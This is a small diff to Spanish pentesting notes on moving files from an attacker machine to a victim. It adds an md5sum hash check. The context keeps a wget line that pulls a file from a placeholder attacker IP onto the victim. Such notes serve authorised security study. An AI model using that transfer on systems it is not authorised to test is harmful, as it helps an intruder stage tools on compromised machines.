@@ -190,6 +190,10 @@ Modos de transferir archivos desde la maquina de atacante
 	# file = Archivo a transferir 
 ```
 
+```bash 
+❯ md5sum file                              # Obtener el hash del archivo 
+```
+
 Manera de descargar archivos en la maquina victima 
 ```bash
 ❯ wget http://❮IP❯/❮File❯                   # Para poder cargar o descargar un archivo especifico desde una IP de atacante
